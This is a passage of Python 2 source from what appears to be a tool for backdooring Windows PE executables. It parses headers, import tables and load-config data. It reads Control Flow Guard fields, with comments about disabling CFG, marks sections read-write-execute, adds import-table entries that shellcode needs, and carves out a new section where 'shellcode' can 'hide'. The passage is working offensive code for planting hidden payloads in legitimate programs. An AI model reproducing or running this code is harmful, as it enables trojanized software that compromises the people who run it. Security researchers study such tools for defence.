self.flItms['SizeOfImageLoc'] = self.binary.tell()\n        self.flItms['SizeOfImage'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['SizeOfHeaders'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['CheckSum'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['Subsystem'] = struct.unpack('<H', self.binary.read(2))[0]\n        self.flItms['DllCharacteristics'] = struct.unpack('<H', self.binary.read(2))[0]\n        if self.flItms['Magic'] == 0x20B:\n            self.flItms['SizeOfStackReserve'] = struct.unpack('<Q', self.binary.read(8))[0]\n            self.flItms['SizeOfStackCommit'] = struct.unpack('<Q', self.binary.read(8))[0]\n            self.flItms['SizeOfHeapReserve'] = struct.unpack('<Q', self.binary.read(8))[0]\n            self.flItms['SizeOfHeapCommit'] = struct.unpack('<Q', self.binary.read(8))[0]\n\n        else:\n            self.flItms['SizeOfStackReserve'] = struct.unpack('<I', self.binary.read(4))[0]\n            self.flItms['SizeOfStackCommit'] = struct.unpack('<I', self.binary.read(4))[0]\n            self.flItms['SizeOfHeapReserve'] = struct.unpack('<I', self.binary.read(4))[0]\n            self.flItms['SizeOfHeapCommit'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['LoaderFlags'] = struct.unpack('<I', self.binary.read(4))[0]  # zero\n        self.flItms['NumberofRvaAndSizes'] = struct.unpack('<I', self.binary.read(4))[0]\n        # End Windows-Specific Fields of Optional Header\n        # Begin Data Directories of Optional Header\n        self.flItms['ExportTableRVA'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['ExportTableSize'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['ImportTableLOCInPEOptHdrs'] = self.binary.tell()\n        #ImportTable SIZE|LOC\n        self.flItms['ImportTableRVA'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['ImportTableSize'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['ResourceTable'] = struct.unpack('<Q', self.binary.read(8))[0]\n        self.flItms['ExceptionTable'] = struct.unpack('<Q', self.binary.read(8))[0]\n        self.flItms['CertTableLOC'] = self.binary.tell()\n        self.flItms['CertLOC'] = struct.unpack(\"<I\", self.binary.read(4))[0]\n        self.flItms['CertSize'] = struct.unpack(\"<I\", self.binary.read(4))[0]\n        self.flItms['BaseReLocationTable'] = struct.unpack('<Q', self.binary.read(8))[0]\n        self.flItms['Debug'] = struct.unpack('<Q', self.binary.read(8))[0]\n        self.flItms['Architecture'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero\n        self.flItms['GlobalPrt'] = struct.unpack('<Q', self.binary.read(8))[0]\n        self.flItms['TLS Table'] = struct.unpack('<Q', self.binary.read(8))[0]\n        self.flItms['LoadConfigTableRVA'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['LoadConfigTableSize'] = struct.unpack('<I', self.binary.read(4))[0]\n        #self.flItms['LoadConfigTable'] = struct.unpack('<Q', self.binary.read(8))[0]\n        self.flItms['BoundImportLocation'] = self.binary.tell()\n        self.flItms['BoundImport'] = struct.unpack('<Q', self.binary.read(8))[0]\n        self.binary.seek(self.flItms['BoundImportLocation'])\n        self.flItms['BoundImportLOCinCode'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['BoundImportSize'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['IAT'] = struct.unpack('<Q', self.binary.read(8))[0]\n        self.flItms['DelayImportDesc'] = struct.unpack('<Q', self.binary.read(8))[0]\n        self.flItms['CLRRuntimeHeader'] = struct.unpack('<Q', self.binary.read(8))[0]\n        self.flItms['Reserved'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero\n        self.flItms['BeginSections'] = self.binary.tell()\n\n        # This could be fixed in the great refactor.\n        if self.flItms['NumberOfSections'] is not 0 and 'Section' not in self.flItms:\n            self.flItms['Sections'] = []\n            for section in range(self.flItms['NumberOfSections']):\n                sectionValues = []\n                sectionValues.append(self.binary.read(8))\n                # VirtualSize\n                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])\n                # VirtualAddress\n                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])\n                # SizeOfRawData\n                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])\n                # PointerToRawData\n                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])\n                # PointerToRelocations\n                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])\n                # PointerToLinenumbers\n                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])\n                # NumberOfRelocations\n                sectionValues.append(struct.unpack('<H', self.binary.read(2))[0])\n                # NumberOfLinenumbers\n                sectionValues.append(struct.unpack('<H', self.binary.read(2))[0])\n                # SectionFlags\n                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])\n                self.flItms['Sections'].append(sectionValues)\n                if 'UPX1'.lower() in sectionValues[0].lower():\n                    print \"[*] UPX packed, continuing...\"\n\n                if ('.text\\x00\\x00\\x00' == sectionValues[0] or\n                    'AUTO\\x00\\x00\\x00\\x00' == sectionValues[0] or\n                    'UPX1\\x00\\x00\\x00\\x00' == sectionValues[0] or\n                    'CODE\\x00\\x00\\x00\\x00' == sectionValues[0]):\n                    self.flItms['textSectionName'] = sectionValues[0]\n                    self.flItms['textVirtualSize'] = sectionValues[1]\n                    self.flItms['textVirtualAddress'] = sectionValues[2]\n                    self.flItms['textSizeRawData'] = sectionValues[3]\n                    self.flItms['textPointerToRawData'] = sectionValues[4]\n\n                    self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -\n                                                       self.flItms['textVirtualAddress'] +\n                                                       self.flItms['textPointerToRawData'] +\n                                                       self.flItms['LocOfEntryinCode_Offset'])\n                elif '.rsrc\\x00\\x00\\x00' == sectionValues[0]:\n                    self.flItms['rsrcSectionName'] = sectionValues[0]\n                    self.flItms['rsrcVirtualSize'] = sectionValues[1]\n                    self.flItms['rsrcVirtualAddress'] = sectionValues[2]\n                    self.flItms['rsrcSizeRawData'] = sectionValues[3]\n                    self.flItms['rsrcPointerToRawData'] = sectionValues[4]\n\n            # I could add in checks here to support an out of order PE file;\n            #  However if here were multiple sections that were RE, RWE, it would be\n            #  difficult to get it right in a purposefully mangled binary.\n            #  Perhaps if entrypoint is in RE section that is text section? But still.\n            #  That could be spoofed and it returns to another RE section.\n            if self.PATCH_METHOD != 'onionduke':\n                if \"textSectionName\" not in self.flItms:\n                    print \"[!] Text section does not have a normal name, not guessing, exiting\"\n                    print \"[!]\\tFirst section, text section potential name:\", str(self.flItms['Sections'][0][0])\n                    return False\n            else:\n                self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -\n                                                   self.flItms['LocOfEntryinCode_Offset'])\n            self.flItms['VirtualAddress'] = self.flItms['SizeOfImage']\n\n        else:\n            self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -\n                                               self.flItms['LocOfEntryinCode_Offset'])\n\n        self.flItms['VrtStrtngPnt'] = (self.flItms['AddressOfEntryPoint'] +\n                                       self.flItms['ImageBase'])\n        self.binary.seek(self.flItms['BoundImportLOCinCode'])\n        self.flItms['ImportTableALL'] = self.binary.read(self.flItms['BoundImportSize'])\n        self.flItms['NewIATLoc'] = self.flItms['BoundImportLOCinCode'] + 40\n        \n        #ParseLoadConfigTable\n        self.flItms['LoadConfigTablePresent'] = False\n                \n        for section in reversed(self.flItms['Sections']):\n            if self.flItms['LoadConfigTableRVA'] >= section[2]:\n                #go to exact export directory location\n                self.flItms['LoadConfigTablePresent'] = True\n                self.binary.seek((self.flItms['LoadConfigTableRVA'] - section[2]) + section[4])\n                self.flItms['LoadConfigTable_OFFSET'] = - section[2] + section[4]\n                break\n\n        if self.flItms['LoadConfigTablePresent'] is True:\n                \n            # This is for 32bit... need x64\n            self.flItms['LoadConfigDirectory_Size'] = struct.unpack('<I', self.binary.read(4))[0]\n            self.flItms['LoadConfigDirectory_TimeDataStamp'] = struct.unpack('<I', self.binary.read(4))[0]\n            self.flItms['LoadConfigDirectory_MajorVersion'] = struct.unpack('<H', self.binary.read(2))[0]\n            self.flItms['LoadConfigDirectory_MinorVersion'] = struct.unpack('<H', self.binary.read(2))[0]\n            self.flItms['LoadConfigDirectory_GFC'] = struct.unpack('<I', self.binary.read(4))[0]\n            self.flItms['LoadConfigDirectory_GFS'] = struct.unpack('<I', self.binary.read(4))[0]\n            self.flItms['LoadConfigDirectory_CSDT'] = struct.unpack('<I', self.binary.read(4))[0]\n            \n            if self.flItms['Magic'] == 0x20B:\n                #  winx64\n                self.flItms['LoadConfigDirectory_DFBT'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LoadConfigDirectory_DTFT'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LoadConfigDirectory_LPTV'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LoadConfigDirectory_MAS'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LoadConfigDirectory_VMT'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LoadConfigDirectory_PAM'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LoadConfigDirectory_PHF'] = struct.unpack('<I', self.binary.read(4))[0]\n            else:\n                #  winx86\n                self.flItms['LoadConfigDirectory_DFBT'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LoadConfigDirectory_DTFT'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LoadConfigDirectory_LPTV'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LoadConfigDirectory_MAS'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LoadConfigDirectory_VMT'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LoadConfigDirectory_PHF'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LoadConfigDirectory_PAM'] = struct.unpack('<I', self.binary.read(4))[0]\n            \n            self.flItms['LoadConfigDirectory_CSDV'] = struct.unpack('<H', self.binary.read(2))[0]\n            self.flItms['LoadConfigDirectory_Reserved'] = struct.unpack('<H', self.binary.read(2))[0]\n            \n            if self.flItms['Magic'] == 0x20B:\n                self.flItms['LoadConfigDirectory_ELVA'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LoadConfigDirectory_SCVA'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LoadConfigDirectory_SEHTVA'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LoadConfigDirectory_SEHC'] = struct.unpack('<Q', self.binary.read(8))[0]\n           \n            else:\n                self.flItms['LoadConfigDirectory_ELVA'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LoadConfigDirectory_SCVA'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LoadConfigDirectory_SEHTVA'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LoadConfigDirectory_SEHC'] = struct.unpack('<I', self.binary.read(4))[0]\n            \n            #grab CFG info\n            if self.flItms['Magic'] == 0x20B and self.flItms['LoadConfigDirectory_Size'] > 0x70:\n                self.flItms['LCD_CFG_address_CF_PTR_LOC'] = self.binary.tell()\n                self.flItms['LCD_CFG_address_CF_PTR'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LCD_CFG_dispatch_fptr'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LCD_CFG_Func_Table'] = struct.unpack('<Q', self.binary.read(8))[0]\n                self.flItms['LCD_CFG_Func_Count'] = struct.unpack('<Q', self.binary.read(8))[0]\n                # Zero out LCD_CFG_Guard_Flags to disable CFG\n                self.flItms['LCD_CFG_Guard_Flags'] = struct.unpack('<Q', self.binary.read(8))[0]\n            elif self.flItms['Magic'] == 0x10B and self.flItms['LoadConfigDirectory_Size'] > 0x48:\n                self.flItms['LCD_CFG_address_CF_PTR_LOC'] = self.binary.tell()\n                self.flItms['LCD_CFG_address_CF_PTR'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LCD_CFG_dispatch_fptr'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LCD_CFG_Func_Table'] = struct.unpack('<I', self.binary.read(4))[0]\n                self.flItms['LCD_CFG_Func_Count'] = struct.unpack('<I', self.binary.read(4))[0]\n                # Zero out LCD_CFG_Guard_Flags to disable CFG\n                self.flItms['LCD_CFG_Guard_Flags'] = struct.unpack('<I', self.binary.read(4))[0]\n\n            #  Find CFG_PTR_LOC \n            if \"LCD_CFG_dispatch_fptr\" in self.flItms:\n                if self.flItms['LCD_CFG_dispatch_fptr'] != 0:\n                    self.flItms['LCD_CFG_dispatch_fptr_LOC'] = self.flItms['LCD_CFG_dispatch_fptr'] - self.flItms['ImageBase'] + self.flItms['LoadConfigTable_OFFSET']\n                    self.binary.seek(self.flItms['LCD_CFG_dispatch_fptr_LOC'],0)\n                    if self.flItms['Magic'] == 0x20B:\n                        self.flItms['CFG_text_LOC'] = struct.unpack('<Q', self.binary.read(8))[0] \n                    else: \n                        self.flItms['CFG_text_LOC'] = struct.unpack('<I', self.binary.read(4))[0]\n\n    def loadthis(self, amod):\n        section = amod.split('.')\n        mod = \".\".join(section[:-1])\n        amod = __import__(mod)\n        for item in section[1:]:\n            amod = getattr(amod, item)\n        return amod\n\n    def preprocess(self):\n        # files in directory\n        ignore = ['__init__.py']\n        abspath = os.path.abspath(__file__)\n        dname = os.path.dirname(abspath)\n        sys.path.append(dname)\n        for afile in os.listdir(dname + \"/preprocessor\"):\n            if afile in ignore:\n                continue\n            if \".pyc\" in afile:\n                continue\n            \n            if len(afile.split(\".\")) > 2:\n                print \"!\" * 50\n                print \"\\t[!] Make sure there are no '.' in your preprocessor filename:\", afile\n                print \"!\" * 50\n                \n                return False\n            \n            name = \"preprocessor.\" +  afile.strip(\".py\")\n            \n            preprocessor_name = __import__( name, fromlist=[''])\n            \n            if preprocessor_name.enabled is True:\n                print \"[*] Executing preprocessor:\", afile.strip(\".py\")\n            else:\n                continue\n            \n            if preprocessor_name.file_format.lower() in ['pe', 'all']: #'elf', 'macho', 'mach-o']:\n                print '[*] Running preprocessor', afile.strip(\".py\"), \"against\", preprocessor_name.file_format, \"formats\"\n            else:\n                continue\n            \n\n            # Allow if any processors to keep it \n            if self.keep_temp is False:\n                self.keep_temp = preprocessor_name.keep_temp\n            \n            # create tempfile here always\n            \n            if self.tmp_file == None:\n                self.tmp_file = tempfile.NamedTemporaryFile()\n                self.tmp_file.write(open(self.FILE, 'rb').read())\n                self.tmp_file.seek(0)\n                print \"[*] Creating temp file:\", self.tmp_file.name\n            else:\n                print \"[*] Using existing tempfile from prior preprocessor\"\n            \n            load_name = name +  \".preprocessor\"\n            preproc = self.loadthis(load_name)\n            \n            m = preproc(self)\n            \n            print \"=\" * 50\n            \n            # execute preprocessor\n            result = m.run()\n            \n            if result is False:\n                print \"[!] Preprocessor Failure :(\"\n\n            print \"=\" * 50\n            \n            # After running push it to BDF.\n            \n            self.FILE = self.tmp_file.name[:]\n    \n            # check for support after each modification\n            if preprocessor_name.recheck_support is True:\n                issupported = self.support_check()\n                if issupported is False:\n                    print self.FILE, \"is not supported.\"\n                    return False                \n\n    def check_apis(self, aFile):\n        ####################################\n        #### Parse imports via pefile ######\n\n        #make this option only if a IAT based shellcode is selected\n        if 'apis_needed' in self.flItms:\n            print \"[*] Loading PE in pefile\"\n            pe = pefile.PE(aFile, fast_load=True)\n            print \"[*] Parsing data directories\"\n            pe.parse_data_directories()\n            self.flItms['neededAPIs'] = set()\n            try:\n                for api in self.flItms['apis_needed']:\n                    apiFound = False\n                    for entry in pe.DIRECTORY_ENTRY_IMPORT:\n                        for imp in entry.imports:\n                            if imp.name is None:\n                                continue\n                            if imp.name.lower() == api.lower():\n                                self.flItms[api + 'Offset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase\n                                self.flItms[api] = imp.address\n                                apiFound = True\n                    if apiFound is False:\n                        self.flItms['neededAPIs'].add(api)\n\n            except Exception as e:\n                print \"Exception:\", str(e)\n            self.flItms['ImportTableFileOffset'] = pe.get_physical_by_rva(self.flItms['ImportTableRVA'])\n\n        #####################################\n\n    def print_flItms(self, flItms):\n\n        keys = self.flItms.keys()\n        keys.sort()\n        print \"*\" * 25, \"BEGIN flItms\", \"*\" * 25\n        for item in keys:\n            if type(self.flItms[item]) == int:\n                print item + ':', hex(self.flItms[item])\n            elif item == 'Sections':\n                print \"-\" * 50\n                for section in self.flItms['Sections']:\n                    print \"Section Name\", section[0]\n                    print \"Virtual Size\", hex(section[1])\n                    print \"Virtual Address\", hex(section[2])\n                    print \"SizeOfRawData\", hex(section[3])\n                    print \"PointerToRawData\", hex(section[4])\n                    print \"PointerToRelocations\", hex(section[5])\n                    print \"PointerToLinenumbers\", hex(section[6])\n                    print \"NumberOfRelocations\", hex(section[7])\n                    print \"NumberOfLinenumbers\", hex(section[8])\n                    print \"SectionFlags\", hex(section[9])\n                    print \"-\" * 50\n            else:\n                print item + ':', self.flItms[item]\n        print \"*\" * 25, \"END flItms\", \"*\" * 25\n\n    def change_section_flags(self, section):\n        \"\"\"\n        Changes the user selected section to RWE for successful execution\n        \"\"\"\n        print \"[*] Changing flags for section:\", section\n        self.flItms['newSectionFlags'] = int('e00000e0', 16)\n        self.binary.seek(self.flItms['BeginSections'], 0)\n        for _ in range(self.flItms['NumberOfSections']):\n            sec_name = self.binary.read(8)\n            if section in sec_name:\n                self.binary.seek(28, 1)\n                self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))\n                return\n            else:\n                self.binary.seek(32, 1)\n\n    def populate_iat_values(self):\n        self.flItms['iatdict'] = {}\n        self.flItms['thunkSectionSize'] = 0\n        self.flItms['lenDLLSection'] = 0\n        self.flItms['iatTransition'] = 0\n        self.flItms['dllCount'] = 0\n        self.flItms['apiCount'] = 0\n        #The new section has three areas:\n        #DLL names [DLL NAME][0x00] * Number of DLLs\n        #thunkSection:\n        #DLL1 THunk1: 0x11223344\n        #DLL1 Thunk2: 0x11223355 0x00000000\n        #DLL2 THunk1: 0x11223366\n        #DLL2 Thunk2: 0x11223377 0x00000000\n        #repeat thunkSection\n        #each address for the thunk points to the API in the next section\n        #[0x0000][DLL1 API1 NAME][0x00]\n        #[0x0000][DLL1 API2 NAME][0x00]\n\n        for api in self.flItms['neededAPIs']:\n            print \"[!] Adding %s Thunk in new IAT\" % api\n            #find DLL\n            for aDLL, exports in winapi.winapi.iteritems():\n                if aDLL not in self.flItms['iatdict'] and api in exports:\n                    self.flItms['lenDLLSection'] += len(aDLL) + 1\n                    self.flItms['iatdict'][aDLL] = {api: 0}\n                    if self.flItms['Magic'] == 0x20B:\n                        self.flItms['thunkSectionSize'] += 16\n                    else:\n                        self.flItms['thunkSectionSize'] += 8\n                    self.flItms['iatTransition'] += 20\n                    self.flItms['dllCount'] += 1\n                if api in exports:\n                    self.flItms['iatdict'][aDLL][api] = 0\n                    if self.flItms['Magic'] == 0x20B:\n                        self.flItms['thunkSectionSize'] += 16\n                    else:\n                        self.flItms['thunkSectionSize'] += 8\n                    self.flItms['apiCount'] += 1\n\n    def build_imports(self):\n\n        #build first structure\n\n        firstStructure = ''\n        dllLen = 0\n        sectionCount = 0\n        for aDLL, api in self.flItms['iatdict'].iteritems():\n            firstStructure += struct.pack(\"<I\", (self.flItms['dllCount'] * 20 + self.flItms['lenDLLSection'] +\n                                                 (self.flItms['thunkSectionSize'] / 2) +\n                                                 self.flItms['BeginningOfNewImports'] + 20 + sectionCount))\n            firstStructure += (struct.pack(\"<Q\", 0x000000000))\n            firstStructure += struct.pack(\"<I\", (self.flItms['dllCount'] * 20 +\n                                                 self.flItms['BeginningOfNewImports'] + 20 + dllLen))\n            firstStructure += struct.pack(\"<I\", (self.flItms['dllCount'] * 20 + self.flItms['lenDLLSection'] +\n                                                 self.flItms['BeginningOfNewImports'] + 20 + sectionCount))\n            dllLen = len(aDLL) + 1\n            sectionCount += 16\n\n        firstStructure += struct.pack(\"<QQI\", 0x0, 0x0, 0x0)\n\n        self.flItms['iatTransition'] = firstStructure\n\n        #build the transition section:\n        #For each DLL in the New Import Table\n        #   1. 1st Address points to the 2nd Thunk grouping's 1st DLL API Address\n        #   2. 8 bytes of 00's\n        #   3. Address points to the DLLName\n        #   4. Address points to the 1st API thunk address group for the DLL API Address\n        #20 bytes of 00's\n        # Figure all the size of this structure\n        # Work backwards to populate\n        #populate thunks\n\n        newDLLSection = ''\n        newthunkSection = ''\n        newapiNameSection = ''\n\n        apiOffset = (self.flItms['lenDLLSection'] + self.flItms['thunkSectionSize'] +\n                     self.flItms['BeginningOfNewImports'] + len(self.flItms['iatTransition']))\n        for aDLL, api in self.flItms['iatdict'].iteritems():\n            newDLLSection += aDLL + struct.pack(\"!B\", 0x0)\n            for apiName, address in api.iteritems():\n                newapiNameSection += struct.pack(\"<H\", 0x0) + apiName + struct.pack(\"<B\", 0x0)\n                api[apiName] = apiOffset\n                if self.flItms['Magic'] == 0x20B:\n                    newthunkSection += struct.pack(\"<Q\", apiOffset)\n                else:\n                    newthunkSection += struct.pack(\"<I\", apiOffset)\n                apiOffset += len(apiName) + 3\n            if self.flItms['Magic'] == 0x20B:\n                newthunkSection += struct.pack(\"<Q\", 0x0)\n            else:\n                newthunkSection += struct.pack(\"<I\", 0x0)\n\n        newthunkSection += newthunkSection\n\n        self.flItms['addedIAT'] = self.flItms['iatTransition'] + newDLLSection + newthunkSection + newapiNameSection\n\n    def patch_in_new_iat(self):\n\n        with open(self.flItms['backdoorfile'], 'r+b') as self.binary:\n            print \"[*] Patching Import Directory Table into a code cave\"\n\n            self.populate_iat_values()\n\n            self.binary.seek(self.flItms['ImportTableFileOffset'], 0)\n\n            self.flItms['Import_Directory_Table'] = ''\n\n            while True:\n                check_chars = \"\\x00\" * 20\n                read_data = self.binary.read(20)\n                if read_data == check_chars:\n                    #Found end of import directory\n                    break\n                self.flItms['Import_Directory_Table'] += read_data\n\n            # get size of new iat\n            newDLLSection = 0\n            newapiNameSection = 0\n            newthunkSection = 0\n            firstStructure = 0\n\n            for aDLL, api in self.flItms['iatdict'].iteritems():\n                firstStructure += 4 + 8 + 4 + 4\n\n            firstStructure += 8 + 8 + 4\n\n            for aDLL, api in self.flItms['iatdict'].iteritems():\n                newDLLSection += len(aDLL) + 1\n                for apiName, address in api.iteritems():\n                    newapiNameSection += 2 + len(apiName) + 1\n                    if self.flItms['Magic'] == 0x20B:\n                        newthunkSection += 8\n                    else:\n                        newthunkSection += 4\n                if self.flItms['Magic'] == 0x20B:\n                    newthunkSection += 8\n                else:\n                    newthunkSection += 4\n\n            newthunkSection += newthunkSection\n\n            self.flItms['sizeNewIAT'] = newDLLSection + newapiNameSection + newthunkSection + len(self.flItms['Import_Directory_Table']) + firstStructure\n            caveTracker = []\n            caveSpecs = []\n            RVA_offset = ''\n            for section in self.flItms['Sections']:\n                if section[4] <= self.flItms['ImportTableFileOffset'] <= section[4] + section[3]:\n                    self.flItms['ImportTableInSectionRange'] = (section[4], section[3] + section[4], section[3])\n\n            p = re.compile((self.flItms['sizeNewIAT'] + 12) * \"\\x00\")\n            self.binary.seek(self.flItms['ImportTableInSectionRange'][0], 0)\n            for m in p.finditer(self.binary.read()):\n                caveSpecs.append(m.start() + self.flItms['ImportTableInSectionRange'][0] + 8)\n                caveSpecs.append(m.start() + self.flItms['ImportTableInSectionRange'][0] + self.flItms['sizeNewIAT'] + 12)\n                caveTracker.append(caveSpecs)\n                caveSpecs = []\n\n            caveSpecs = []\n            for section in self.flItms['Sections']:\n                if section[4] <= caveTracker[len(caveTracker) - 1][0] <= section[4] + section[3]:\n                    caveSpecs = caveTracker[len(caveTracker) - 1]\n                    RVA_offset = section[2] - section[4]\n\n            #  self.iat_cave_loc is to reverse the space for patching later\n            self.iat_cave_loc = caveSpecs\n            self.flItms['NewIAT_Loc'] = caveSpecs[0]\n\n            self.binary.seek(self.flItms['NewIAT_Loc'], 0)\n            self.binary.write(self.flItms['Import_Directory_Table'])\n            #Add new imports\n            self.flItms['BeginningOfNewImports'] = RVA_offset + caveSpecs[0] + len(self.flItms['Import_Directory_Table'])\n            self.build_imports()\n            self.binary.write(self.flItms['addedIAT'])\n            self.binary.seek(self.flItms['ImportTableLOCInPEOptHdrs'], 0)\n            #RVA...\n            self.binary.write(struct.pack(\"<I\", RVA_offset + self.flItms['NewIAT_Loc']))\n            self.binary.write(struct.pack(\"<I\", (self.flItms['ImportTableSize']) + self.flItms['apiCount'] * 8 + 20))\n            self.binary.seek(0)\n\n        with open(self.flItms['backdoorfile'], 'r+b') as self.binary:\n            if self.gather_file_info_win() is False:\n                return False\n\n        return True\n\n    def create_new_iat(self):\n        \"\"\"\n        Creates new import table for missing imports in a new section\n        \"\"\"\n        print \"[*] Adding New Section for updated Import Table\"\n\n        with open(self.flItms['backdoorfile'], 'r+b') as self.binary:\n            self.populate_iat_values()\n            self.flItms['NewSectionSize'] = 0x1000\n            self.flItms['SectionName'] = 'rdata1'  # less than 7 chars\n            #Not the best way to find the new section (update for appending when fix found)\n            #newSetionPointerToRawData == last section pointer_to_rawdata and virtualsize\n            self.flItms['newSectionPointerToRawData'] = self.flItms['Sections'][-1][3] + self.flItms['Sections'][-1][4]\n            self.flItms['VirtualSize'] = self.flItms['NewSectionSize']\n            self.flItms['SizeOfRawData'] = self.flItms['VirtualSize']\n            self.flItms['NewSectionName'] = \".\" + self.flItms['SectionName']\n            self.flItms['newSectionFlags'] = int('C0000040', 16)\n            #get file size\n            filesize = os.stat(self.flItms['backdoorfile']).st_size\n            if filesize > self.flItms['SizeOfImage']:\n                print \"[!] File has extra data after last section, cannot add new section\"\n                return False\n            self.binary.seek(self.flItms['pe_header_location'] + 6, 0)\n            self.binary.write(struct.pack('<H', self.flItms['NumberOfSections'] + 1))\n            self.binary.seek(self.flItms['SizeOfImageLoc'], 0)\n            self.flItms['NewSizeOfImage'] = (self.flItms['VirtualSize'] +\n                                             self.flItms['SizeOfImage'])\n            self.binary.write(struct.pack('<I', self.flItms['NewSizeOfImage']))\n            self.binary.seek(self.flItms['BoundImportLocation'])\n            if self.flItms['BoundImportLOCinCode'] != 0:\n                self.binary.write(struct.pack('<I', self.flItms['BoundImportLOCinCode'] + 40))\n            self.binary.seek(self.flItms['BeginSections'] +\n                             40 * self.flItms['NumberOfSections'], 0)\n            self.binary.write(self.flItms['NewSectionName'] +\n                              \"\\x00\" * (8 - len(self.flItms['NewSectionName'])))\n            self.binary.write(struct.pack('<I', self.flItms['VirtualSize']))\n            self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))\n            self.binary.write(struct.pack('<I', self.flItms['SizeOfRawData']))\n            self.binary.write(struct.pack('<I', self.flItms['newSectionPointerToRawData']))\n            if self.VERBOSE is True:\n                print 'New Section PointerToRawData:', self.flItms['newSectionPointerToRawData']\n            self.binary.write(struct.pack('<I', 0))\n            self.binary.write(struct.pack('<I', 0))\n            self.binary.write(struct.pack('<I', 0))\n            self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))\n            self.binary.write(self.flItms['ImportTableALL'])\n\n            self.binary.seek(self.flItms['ImportTableFileOffset'], 0)\n            #-20 here\n            self.flItms['Import_Directory_Table'] = ''\n\n            while True:\n                check_chars = \"\\x00\" * 20\n                read_data = self.binary.read(20)\n                if read_data == check_chars:\n                    #Found end of import directory\n                    break\n                self.flItms['Import_Directory_Table'] += read_data\n\n            #self.flItms['Import_Directory_Table'] = self.binary.read(self.flItms['ImportTableSize'] - 20)\n            self.binary.seek(self.flItms['newSectionPointerToRawData'], 0)  # moving to end of file\n            #test write\n            self.binary.write(self.flItms['Import_Directory_Table'])\n            #Add new imports\n            self.flItms['BeginningOfNewImports'] = self.flItms['SizeOfImage'] + len(self.flItms['Import_Directory_Table'])\n            self.build_imports()\n            #and remove here\n\n            self.binary.write(self.flItms['addedIAT'])\n            self.binary.write(struct.pack(\"<B\", 0x0) * (self.flItms['NewSectionSize'] -\n                              len(self.flItms['addedIAT']) - len(self.flItms['Import_Directory_Table']) + 20))\n            self.binary.seek(self.flItms['ImportTableLOCInPEOptHdrs'], 0)\n            self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))\n            self.binary.write(struct.pack(\"<I\", (self.flItms['ImportTableSize']) + self.flItms['apiCount'] * 8 + 20))\n            self.binary.seek(0)\n            #For trimming File of cert (if there)\n\n        #get file data again\n        with open(self.flItms['backdoorfile'], 'r+b') as self.binary:\n            if self.gather_file_info_win() is False:\n                return False\n\n        return True\n\n    def create_code_cave(self):\n        \"\"\"\n        This function creates a code cave for shellcode to hide,\n        takes in the dict from gather_file_info_win function and\n        writes to the file and returns flItms\n        \"\"\"\n        print \"[*] Creating Code Cave\"\n        self.flItms['NewSectionSize'] = len(self.flItms['shellcode']) + 250  # bytes\n        self.flItms['SectionName'] = self.NSECTION  # less than 7 chars\n        self.flItms['filesize'] = os.stat(self.flItms['filename']).st_size\n        self.flItms['newSectionPointerToRawData'] = self.flItms['filesize']\n        self.flItms['VirtualSize'] = int(str(self.flItms['NewSectionSize']), 16)\n        self.flItms['SizeOfRawData'] = self.flItms['VirtualSize']\n        self.flItms['NewSectionName'] = \".\" + self.flItms['SectionName']\n        self.flItms['newSectionFlags'] = int('e00000e0', 16)\n        self.binary.seek(self.flItms['pe_header_location'] + 6, 0)\n        self.binary.write(struct.pack('<H', self.flItms['NumberOfSections'] + 1))\n        self.binary.seek(self.flItms['SizeOfImageLoc'], 0)\n        self.flItms['NewSizeOfImage'] = (self.flItms['VirtualSize'] +\n                                         self.flItms['SizeOfImage'])\n        self.binary.write(struct.pack('<I', self.flItms['NewSizeOfImage']))\n        